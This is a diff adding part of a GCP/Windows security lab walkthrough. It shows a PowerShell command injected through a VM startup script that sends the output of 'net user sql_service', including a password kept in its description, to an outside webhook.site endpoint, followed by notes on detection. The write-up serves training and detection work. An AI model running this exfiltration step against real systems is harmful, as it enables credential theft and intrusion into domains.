+Assumming that you injected the `net user` command first and discovered that the windows domain has a user `sql_service` (which you may recall, has its password in the resource description), this will be your next injection command:
+
+```PowerShell
+Start-Sleep -Seconds 60; Invoke-WebRequest -Uri "https://webhook.site/{your-token}" -UseBasicParsing -Method POST -Body $(net user sql_service)
+```
+
+![](/src/images/scc-secops-lab/72-misc-rodc_net_user_outbound_exfil.png)
+
+Notice that the injected command has a delay of one minute. This is because the startup scritps run too early during the boot proces, specifically before the Local Security Authority Subsystem Service (LSASS) and the IE COM engine (Internet Explorer).
+
+You can read more about startup scripts in [Use startup scripts on Windows VMs](https://cloud.google.com/compute/docs/instances/startup-scripts/windows). Try to build your own initial access script in a different way.
+
+**Final considerations**
+
+For our lab this is fantastic. You can now login to the Windows domain remotely using the **SQL Service** account credentials (which you may recall, has admin privileges).
+
+In a real world attack, adversaries will not (or shouldn't?) be that silly. Loging in with a service account remotely is a big red flag!
+
+Additionally, the script we ran earlier is quite noisy. Organizations with powershell monitoring will detect that kind of behavior.
+
+Finally, notice that the whole attack path was possible just because we were able to gather an authentication token. Accounts mananging applications deployed in cloud instances must be carefully evaluated (Never leave default accounts).
+
+Take a look at section [Scenario 1: Detect Forbidden or Abnormal Usage of GCP API](#scenario-1-detect-forbidden-or-abnormal-usage-of-gcp-api) to get more information about detection and prevention  mechanisms with Google SecOps and Google Security Command Center for this technique.
 
 ## Happy Detection!
 
-### Scenario 1: Detect Access Token Usage
+### Scenario 1: Detect Forbidden or Abnormal Usage of GCP API
 
+TODO
